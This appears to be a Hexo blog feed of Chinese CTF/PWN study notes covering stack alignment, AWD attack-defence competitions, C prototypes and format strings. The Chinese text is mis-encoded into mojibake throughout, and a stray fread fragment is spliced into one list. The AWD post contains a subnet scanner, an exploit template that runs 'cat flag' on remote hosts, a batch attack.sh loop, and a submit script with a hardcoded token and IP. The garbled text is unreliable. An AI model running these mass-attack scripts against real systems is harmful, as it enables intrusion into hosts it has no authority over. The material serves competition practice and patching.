<strong>vulnerable_function</strong> å‰çš„æ ˆé¡¶ä¸º <strong>origin_sp</strong> ï¼Œåˆ™æœ‰ï¼š<strong>(origin_sp - 0x390 + 0x50) % 0x10 == 0</strong> ã€‚ä¹Ÿå³ <strong>origin_sp % 0x10 == 0</strong> ã€‚</p><p>åŸºäºä¸Šè¿°åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ <strong>vulnerable_function</strong> çš„åœ°å€å‰å¢åŠ ä¸€ä¸ªæ–°çš„åœ°å€ï¼Œè¯¥åœ°å€æ°å¥½æŒ‡å‘ä¸€ä¸ª <strong>ret</strong> æŒ‡ä»¤ã€‚è¿™æ ·ä¸€æ¥ï¼Œç”±äºåŠ å…¥äº†ä¸€ä¸ªæ–°åœ°å€ï¼Œæ ˆé¡¶è¢«è¿«ä¸‹ç§»8ä¸ªå­—èŠ‚ï¼Œä½¿ä¹‹å¯¹é½ <strong>16Byte</strong> ï¼›åŒæ—¶ï¼Œç”±äºæ’å…¥çš„åœ°å€æŒ‡å‘äº† <strong>ret</strong> æŒ‡ä»¤ï¼Œç¨‹åºçš„ä»ç„¶å¯ä»¥é¡ºåˆ©åœ°è¿›å…¥ <strong>vulnerable_function</strong> ä¸­ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2025/02/16/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E5%AF%B9%E9%BD%90/image-20250326003450415.png" alt="image-20250326003450415"></p><p>è‡³äºæŒ‡å‘ <strong>ret</strong> æŒ‡ä»¤çš„åœ°å€ï¼Œå¯ä»¥åœ¨IDAä¸­ä½¿ç”¨å¿«æ·é”® <strong>alt + T</strong> è¿›è¡Œæœç´¢ã€‚</p><p>ç»¼ä¸Šï¼Œæˆ‘ä»¬ç»ˆäºå¯ä»¥å†™å‡ºæ‰“é€šæœ¬åœ°ç¯å¢ƒçš„payloadäº†ï¼š</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ ˆ </tag>
            
            <tag> PWNæŠ€å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWDå­¦ä¹ </title>
      <link href="/2025/02/16/AWD%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/02/16/AWD%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h2><ul><li>æ”¹<code>init_hosts.py</code>ä¸­çš„<code>ip</code>æ ¼å¼å’Œ<code>port</code></li><li>æ”¹<code>submit_flag.py</code>ä¸­çš„æäº¤æ–¹å¼å’Œ<code>token</code></li><li>æ”¹<code>round_wait_time</code></li><li>xxxxxxxxxx6 1size_t fread(void <em>ptr, size_t size, size_t nmemb, FILE </em>stream)2â€‹3ptr â€“ è¿™æ˜¯æŒ‡å‘å¸¦æœ‰æœ€å°å°ºå¯¸ size*nmemb å­—èŠ‚çš„å†…å­˜å—çš„æŒ‡é’ˆ4size â€“ è¿™æ˜¯è¦è¯»å–çš„æ¯ä¸ªå…ƒç´ çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½5nmemb â€“ è¿™æ˜¯å…ƒç´ çš„ä¸ªæ•°ï¼Œæ¯ä¸ªå…ƒç´ çš„å¤§å°ä¸º size å­—èŠ‚6stream â€“ è¿™æ˜¯æŒ‡å‘ FILE å¯¹è±¡çš„æŒ‡é’ˆï¼Œè¯¥ FILE å¯¹è±¡æŒ‡å®šäº†ä¸€ä¸ªè¾“å…¥æµC</li><li>å†™<code>exp</code></li><li>æ‰¹é‡æ”»å‡»</li></ul><h2 id="æ‰«æIP"><a href="#æ‰«æIP" class="headerlink" title="æ‰«æIP"></a>æ‰«æIP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requestsimport threading li &#x3D; lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)ll &#x3D; lambda x : print(&#39;\x1b[01;38;5;1m&#39; + x + &#39;\x1b[0m&#39;) def check_ip(i):    try:        url &#x3D; f&#39;http:&#x2F;&#x2F;192-168-1-&#123;i&#125;.awd.bugku.cn&#x2F;&#39; #*        response &#x3D; requests.get(url, timeout&#x3D;0.5)        if response.status_code &#x3D;&#x3D; 200:            li(&#39;[+] &#39; + url)            with open(&#39;hosts&#39;, &#39;a+&#39;) as f:                f.write(f&#39;192-168-1-&#123;i&#125;.awd.bugku.cn:9999\n&#39;) #*        else:            raise Exception(&quot;Not 200 OK&quot;)    except Exception as e:        ll(&#39;[-] &#39; + url)        with open(&#39;h&#39;, &#39;a+&#39;) as f:            f.write(f&#39;192-168-1-&#123;i&#125;.awd.bugku.cn:9999\n&#39;) #* NUM_THREADS &#x3D; 256 threads &#x3D; []for i in range(1, 256):    thread &#x3D; threading.Thread(target&#x3D;check_ip, args&#x3D;(i,))    threads.append(thread)    thread.start()     if len(threads) &gt;&#x3D; NUM_THREADS:        for t in threads:            t.join()        threads &#x3D; [] for t in threads:    t.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h2><h3 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><ul><li>IDA</li><li>åŠ æ²™ç®±ï¼š<a href="https://github.com/TTY-flag/evilPatcher#/">https://github.com/TTY-flag/evilPatcher#/</a></li><li><a href="https://github.com/aftern00n/AwdPwnPatcher#/">https://github.com/aftern00n/AwdPwnPatcher#/</a></li></ul><h3 id="å·¥å…·ä½¿ç”¨"><a href="#å·¥å…·ä½¿ç”¨" class="headerlink" title="å·¥å…·ä½¿ç”¨"></a>å·¥å…·ä½¿ç”¨</h3><ul><li><p>åŠ æ²™ç®±é€šé˜²</p><ul><li>sandboxsé‡Œæ”¹ç¦ç”¨è§„åˆ™<ul><li>python3 evil_patcher.py file_name sandboxfile</li></ul></li></ul></li><li><p>IDAçš„patchæ­¥éª¤ï¼š<code>Edit</code> -&gt;<code>Patch program</code> -&gt; <code>Apply patches to input file</code></p></li><li><p>AWDPwnPatcherä½¿ç”¨</p></li><li><code>from AwdPwnPatcher import *binary = &quot;filename&quot;awd_pwn_patcher = AwdPwnPatcher(binary)</code></li><li><code>add_patch_in_ehframe(assembly=&quot;&quot;, machine_code=[])</code></li><li><code>patch_origin(start, end=0, assembly=&quot;&quot;, machine_code=[], string=&quot;&quot;)</code></li><li><code>patch_by_jmp(self, jmp_from, jmp_to=0, assembly=&quot;&quot;, machine_code=[])</code></li><li><code>patch_by_call(self, call_from, assembly=&quot;&quot;, machine_code=[])</code></li><li><code>add_constant_in_ehframe(self, string)</code></li><li><code>save(self, save_path=&quot;&quot;)</code></li></ul><h3 id="å…·ä½“æ¼æ´ä¿®å¤"><a href="#å…·ä½“æ¼æ´ä¿®å¤" class="headerlink" title="å…·ä½“æ¼æ´ä¿®å¤"></a>å…·ä½“æ¼æ´ä¿®å¤</h3><h4 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h4><h5 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from AwdPwnPatcher import *binary &#x3D; &quot;filename&quot;awd_pwn_patcher &#x3D; AwdPwnPatcher(binary)awd_pwn_patcher.patch_fmt_by_call(address)  #call printfåœ°å€awd_pwn_patcher.save()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from AwdPwnPatcher import *binary &#x3D; &quot;filename&quot;awd_pwn_patcher &#x3D; AwdPwnPatcher(binary) fmt_offset &#x3D; awd_pwn_patcher.add_constant_in_ehframe(&quot;%s\\x00\\x00&quot;)  #æ·»åŠ %s assembly &#x3D; &quot;&quot;&quot;mov rsi, qword ptr [rbp-0x8]lea rdi, qword ptr [&#123;&#125;]&quot;&quot;&quot;.format(hex(fmt_offset)) awd_pwn_patcher.patch_by_jmp(0x706, jmp_to&#x3D;0x712, assembly&#x3D;assembly)    #æ”¹printfï¼Œmov raxåœ°å€å’Œcall printfåœ°å€awd_pwn_patcher.save()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ ˆæº¢å‡º"><a href="#æ ˆæº¢å‡º" class="headerlink" title="æ ˆæº¢å‡º"></a>æ ˆæº¢å‡º</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">from AwdPwnPatcher import *binary &#x3D; &quot;filename&quot;awd_pwn_patcher &#x3D; AwdPwnPatcher(binary) assembly &#x3D; &#39;&#39;&#39;push 0x20   #ç¼©å°è¾“å…¥èŒƒå›´ï¼Œæ§åˆ¶å¯„å­˜å™¨pushè¿›å»çš„å€¼&#39;&#39;&#39; awd_pwn_patcher.patch_origin(0x8048476, end&#x3D;0x804847b, assembly&#x3D;assembly)   #åŸpushåœ°å€å’Œpushçš„ä¸‹ä¸€æ¡åœ°å€awd_pwn_patcher.save()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><h5 id="32ä½-1"><a href="#32ä½-1" class="headerlink" title="32ä½"></a>32ä½</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from AwdPwnPatcher import *binary &#x3D; &quot;.&#x2F;filename&quot;awd_pwn_patcher &#x3D; AwdPwnPatcher(binary) assembly &#x3D; &quot;&quot;&quot;add esp, 0x10mov eax, 0mov edx, dword ptr [ebp - 0x20]mov eax, 0x804a060  #è¢«é‡Šæ”¾çš„åœ°å€lea eax, dword ptr [eax + edx*4]mov dword ptr [eax], 0&quot;&quot;&quot; awd_pwn_patcher.patch_by_jmp(0x80485bf, jmp_to&#x3D;0x80485c7, assembly&#x3D;assembly)    #call freeåœ°å€å’Œä¸‹ä¸€æ¡åœ°å€awd_pwn_patcher.save()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="64ä½-1"><a href="#64ä½-1" class="headerlink" title="64ä½"></a>64ä½</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from AwdPwnPatcher import *binary &#x3D; &quot;.&#x2F;filename&quot;awd_pwn_patcher &#x3D; AwdPwnPatcher(binary) assembly &#x3D; &quot;&quot;&quot;mov eax, 0mov eax, dword ptr [rbp - 0x1c]cdqelea rdx, qword ptr [0x201040]lea rax, qword ptr [rdx + rax*8]mov qword ptr [rax], 0&quot;&quot;&quot; awd_pwn_patcher.patch_by_jmp(0x838, jmp_to&#x3D;0x83d, assembly&#x3D;assembly)awd_pwn_patcher.save()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="gets-æ ˆæº¢å‡º"><a href="#gets-æ ˆæº¢å‡º" class="headerlink" title="gets æ ˆæº¢å‡º"></a>gets æ ˆæº¢å‡º</h4><p>åªæœ‰getså‡½æ•°èƒ½å¤Ÿæ¥å—ç”¨æˆ·è¾“å…¥æ—¶ï¼Œå°†æµç¨‹åŠ«æŒåˆ°.eh_frameæ®µï¼Œåˆ©ç”¨syscallæ„é€ readå‡½æ•°ï¼Œå°±èƒ½æ§åˆ¶è¾“å…¥æ•°æ®çš„é•¿åº¦ã€‚<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">.eh_frame:0000000000400F7D mov     rax, 0          ;#define __NR_read 0.eh_frame:0000000000400F84 mov     rdi, 0          ; fd.eh_frame:0000000000400F8B lea     rsi, [rbp+buf]  ; buf.eh_frame:0000000000400F8E mov     rdx, 90h        ; count.eh_frame:0000000000400F95 syscall.eh_frame:0000000000400F97 jmp     loc_400AB4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h4 id="è´Ÿæ•°ç»•è¿‡"><a href="#è´Ÿæ•°ç»•è¿‡" class="headerlink" title="è´Ÿæ•°ç»•è¿‡"></a>è´Ÿæ•°ç»•è¿‡</h4><p>è¾“å…¥è´Ÿæ•°-1ä¹Ÿæ»¡è¶³jleï¼Œä¿®å¤æ–¹æ³•ï¼šå°†JLEæ”¹ä¸ºJBE<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">cmp     eax, 20hjle     short loc_8048777<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python3# A script for awd exp import osimport sysfrom time import sleepfrom pwn import * context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;, log_level&#x3D;&#39;debug&#39;) file_name &#x3D; &#39;.&#x2F;pwn&#39; li &#x3D; lambda x : print(&#39;\x1b[01;38;5;214m&#39; + str(x) + &#39;\x1b[0m&#39;)ll &#x3D; lambda x : print(&#39;\x1b[01;38;5;1m&#39; + str(x) + &#39;\x1b[0m&#39;)  def write_to_flags(d):    fd &#x3D; open(&#39;.&#x2F;flags&#39;, &#39;ab&#39;)    fd.write(d + b&#39;\n&#39;)    fd.close() ip &#x3D; server_ip &#x3D; sys.argv[1].split(&#39;:&#39;)[0]port &#x3D; int(sys.argv[1].split(&#39;:&#39;)[1])r &#x3D; remote(ip, port) ......#exp r.sendline(b&#39;cat flag&#39;)r.recvuntil(b&#39;&#123;&#39;)flag &#x3D; b&#39;viol1t&#123;&#39; + r.recvuntil(b&#39;&#125;&#39;)write_to_flags(flag) r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="submit-flag-py"><a href="#submit-flag-py" class="headerlink" title="submit_flag.py"></a>submit_flag.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python3# A script for awd loop submit flagimport threadingfrom time import sleepimport osimport jsonimport requests flag_file &#x3D; &#39;.&#x2F;flags&#39;threads &#x3D; [] def submit(flag):    try:        # url &#x3D; &#39;https:&#x2F;&#x2F;ctf.bugku.com&#x2F;awd&#x2F;submit.html?token&#x3D;88b02ce3b420ec1f4b4a2e02dd6fe305&amp;flag&#x3D;&#39; + flag[:-1]        url &#x3D; f&quot;curl -X POST http:&#x2F;&#x2F;27.25.152.77:19999&#x2F;api&#x2F;flag -H &#39;Authorization: 7f120ca9b0e3024d06734a04a986cc55&#39; -d &#39;&#123;&#123; \&quot;flag\&quot;: \&quot;&#123;flag[:-1]&#125;\&quot;&#125;&#125;&#39;&quot;        print(url)        # r &#x3D; requests.get(url)        os.system(url)        print(&#39;\x1b[01;38;5;214m[+] pwned!\x1b[0m&#39;)    except Exception as e:        print(&#39;\x1b[01;38;5;214m[-] connect fail: &#123;&#125;\x1b[0m&#39;.format(str(e)))def main():    with open(flag_file) as flag_txt:        flags &#x3D; flag_txt.readlines()        for flag in flags:            thread &#x3D; threading.Thread(target&#x3D;submit, args&#x3D;(flag,))            threads.append(thread)            thread.start()        for thread in threads:            thread.join()if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="attack-sh"><a href="#attack-sh" class="headerlink" title="attack.sh"></a>attack.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">#! &#x2F;bin&#x2F;bash attack_times&#x3D;10000round_wait_time&#x3D;30 #half timewait_submit_time&#x3D;5log_file&#x3D;&quot;logs&quot;run_time&#x3D;120 #timeoutnext_attack_time&#x3D;2.5 max_concurrent_attacks&#x3D;10 # Max number of concurrent attacks log()&#123;    t&#x3D;$(date &quot;+%H:%M:%S&quot;)    m&#x3D;&quot;[$t]$1&quot; # Fixed missing parameter usage    info&#x3D;&quot;\033[43;37m $m \033[0m&quot;    echo -e &quot;$info&quot;    echo -e &quot;$m&quot; &gt;&gt; $log_file&#125; attack() &#123;    echo &quot;-- round $1 -- &quot; &gt;&gt; all_flags    cat flags &gt;&gt; all_flags    rm flags    local jobs&#x3D;0    for line in $(cat hosts); do        timeout --foreground $run_time python3 .&#x2F;exp.py &quot;$line&quot; &amp;        sleep $next_attack_time        ((jobs++))        if [ &quot;$jobs&quot; -ge &quot;$max_concurrent_attacks&quot; ]; then            wait # Wait for all background jobs to finish            jobs&#x3D;0        fi    done    wait # Ensure all attacks are complete before moving on    echo -e &quot;\x1b[47;30m Waiting $wait_submit_time s to submit flag\x1b[0m&quot;    sleep $wait_submit_time    echo -e &quot;\x1b[47;30m Submitting flag\x1b[0m&quot;    python3 .&#x2F;submit_flag.py&#125; for ((i&#x3D;1; i &lt;&#x3D; attack_times; i++)); do    m&#x3D;&quot;-------- round $i --------&quot;    log &quot;$m&quot;    attack $i    echo -e &quot;\x1b[47;30m Waiting next round\x1b[0m&quot;    sleep $round_wait_timedone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æµé‡ç›‘æ§"><a href="#æµé‡ç›‘æ§" class="headerlink" title="æµé‡ç›‘æ§"></a>æµé‡ç›‘æ§</h2><h3 id="pwn-waf"><a href="#pwn-waf" class="headerlink" title="pwn_waf"></a>pwn_waf</h3><p><a href="https://github.com/i0gan/pwn_waf/tree/main">https://github.com/i0gan/pwn_waf/tree/main</a></p><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹å¹¶èµ‹ä¸€å®šæƒé™ï¼Œæ”¹makefileä¸­çš„log pathä¸ºè¯¥æ–‡ä»¶å¤¹åœ°å€ï¼Œmakeåå°†pwnå’Œcatchæ”¾åˆ°åˆ›å»ºçš„æ–‡ä»¶å¤¹ä¸­ï¼Œå†ç”¨catchæ›¿æ¢pwnæ–‡ä»¶ï¼Œæ­¤æ—¶expæ‰“ç”¨catchæ›¿æ¢çš„pwnæ–‡ä»¶å³å¯åœ¨åˆ›å»ºçš„æ–‡ä»¶å¤¹ä¸­æ¥æ”¶åˆ°æµé‡</p><h3 id><a href="#" class="headerlink" title=" "></a> </h3>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cè¯­è¨€å‡½æ•°åŸå‹æ•´ç†</title>
      <link href="/2025/02/14/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B%E6%95%B4%E7%90%86/"/>
      <url>/2025/02/14/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p><strong>å½“systemå‡½æ•°æ‰§è¡Œçš„æ—¶å€™ä¼šåˆ©ç”¨åˆ°<code>rdi</code>é‡Œçš„å‚æ•°</strong></p><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p><code>writeï¼ˆ1ï¼Œwrite_gotï¼Œ8</code>ï¼‰æ˜¯æŠŠwrite_gotåœ°å€æŒ‡å‘å†…å­˜çš„å†…å®¹çš„å‰8ä¸ªå­—èŠ‚å†™å…¥åˆ°æ ‡å‡†è¾“å‡ºæµä¸­ã€‚<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">ssize_t write(int fd, const void *buf, size_t count)å‚æ•°è¯´æ˜:â€Œfdâ€Œ:æ–‡ä»¶æè¿°ç¬¦ï¼Œè¡¨ç¤ºè¦å†™å…¥æ•°æ®çš„æ–‡ä»¶æˆ–è®¾å¤‡ã€‚æ–‡ä»¶æè¿°ç¬¦æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œé€šå¸¸æ˜¯ç”±openç³»ç»Ÿè°ƒç”¨è¿”å›çš„ã€‚ä¾‹å¦‚ï¼Œ0è¡¨ç¤ºæ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰ï¼Œ1è¡¨ç¤ºæ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰ï¼Œ2è¡¨ç¤ºæ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰ã€‚â€Œbufâ€Œ:æŒ‡å‘è¦å†™å…¥æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚è¿™ä¸ªæŒ‡é’ˆå¯ä»¥æ˜¯ä»»ä½•ç±»å‹çš„æ•°æ®ï¼Œå› ä¸ºå®ƒæ˜¯voidç±»å‹çš„ã€‚countâ€Œ:è¦å†™å…¥çš„å­—èŠ‚æ•°ã€‚å‡½æ•°ä¼šå°è¯•ä»bufä¸­å†™å…¥countä¸ªå­—èŠ‚çš„æ•°æ®ã€‚â€Œè¿”å›å€¼:æ­£æ•´æ•°:è¡¨ç¤ºæˆåŠŸå†™å…¥çš„å­—èŠ‚æ•°ï¼Œå¯èƒ½ä¼šå°äºcountï¼ˆä¾‹å¦‚ï¼Œç”±äºç£ç›˜å·²æ»¡ç­‰åŸå› ï¼‰ã€‚0â€Œ:è¡¨ç¤ºæ²¡æœ‰å†™å…¥ä»»ä½•æ•°æ®ã€‚-1â€Œâ€Œ:è¡¨ç¤ºå‘ç”Ÿé”™è¯¯ï¼Œå¹¶è®¾ç½®&#96;errno&#96;æ¥æä¾›è¿›ä¸€æ­¥çš„é”™è¯¯ä¿¡æ¯ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">ssize_t read(int fd,void*buf,size_t count)å‚æ•°è¯´æ˜ï¼šfd:æ˜¯æ–‡ä»¶æè¿°ç¬¦buf:ä¸ºè¯»å‡ºæ•°æ®çš„ç¼“å†²åŒº;count:ä¸ºæ¯æ¬¡è¯»å–çš„å­—èŠ‚æ•°ï¼ˆæ˜¯è¯·æ±‚è¯»å–çš„å­—èŠ‚æ•°ï¼Œè¯»ä¸Šæ¥çš„æ•°æ®ä¿å­˜åœ¨ç¼“å†²åŒºbufä¸­ï¼ŒåŒæ—¶æ–‡ä»¶çš„å½“å‰è¯»å†™ä½ç½®å‘åç§»)æˆåŠŸ:è¿”å›è¯»å‡ºçš„å­—èŠ‚æ•°å¤±è´¥:è¿”å›-1ï¼Œå¹¶è®¾ç½®errnoï¼Œå¦‚æœåœ¨è°ƒç”¨readä¹‹å‰åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼Œåˆ™è¿™æ¬¡readè¿”å›0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">void * memset( void * ptr, int value, size_t num );å‚æ•°è¯´æ˜ï¼šptr:ä¸ºè¦æ“ä½œçš„å†…å­˜çš„æŒ‡é’ˆã€‚value:ä¸ºè¦è®¾ç½®çš„å€¼ã€‚ä½ æ—¢å¯ä»¥å‘ value ä¼ é€’ int ç±»å‹çš„å€¼ï¼Œä¹Ÿå¯ä»¥ä¼ é€’ char ç±»å‹çš„å€¼ï¼Œint å’Œ char å¯ä»¥æ ¹æ® ASCII ç ç›¸äº’è½¬æ¢ã€‚num:ä¸º ptr çš„å‰ num ä¸ªå­—èŠ‚size_t:å°±æ˜¯unsigned intã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)ptr â€“ è¿™æ˜¯æŒ‡å‘å¸¦æœ‰æœ€å°å°ºå¯¸ size*nmemb å­—èŠ‚çš„å†…å­˜å—çš„æŒ‡é’ˆsize â€“ è¿™æ˜¯è¦è¯»å–çš„æ¯ä¸ªå…ƒç´ çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½nmemb â€“ è¿™æ˜¯å…ƒç´ çš„ä¸ªæ•°ï¼Œæ¯ä¸ªå…ƒç´ çš„å¤§å°ä¸º size å­—èŠ‚stream â€“ è¿™æ˜¯æŒ‡å‘ FILE å¯¹è±¡çš„æŒ‡é’ˆï¼Œè¯¥ FILE å¯¹è±¡æŒ‡å®šäº†ä¸€ä¸ªè¾“å…¥æµ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNå…¥é—¨-æ ¼å¼åŒ–å­—ç¬¦ä¸²</title>
      <link href="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‚è€ƒ<a href="https://blog.csdn.net/weixin_34128411/article/details/87980752">æ¼æ´æŒ–æ˜åŸºç¡€ä¹‹æ ¼å¼åŒ–å­—ç¬¦ä¸²-CSDNåšå®¢</a></p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä»‹ç»"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä»‹ç»" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä»‹ç»"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä»‹ç»</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å…¶æ¥è§£æä¹‹åçš„å‚æ•°ã€‚ä¸€èˆ¬æ¥è¯´æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨åˆ©ç”¨çš„æ—¶å€™ä¸»è¦åˆ†ä¸‰ä¸ªéƒ¨åˆ†</p><ul><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°</li><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²</li><li>åç»­å‚æ•°<h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°</h3>è¾“å…¥å‡½æ•°ï¼š<code>scanf</code><br>è¾“å‡ºå‡½æ•°ï¼š![[Pasted image 20250209201042.png]]<h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h3>åŸºæœ¬æ ¼å¼å¦‚ä¸‹<pre class="line-numbers language-C" data-language="C"><code class="language-C">%[parameter] [flag] [field width] [.precision] [length] type<span aria-hidden="true" 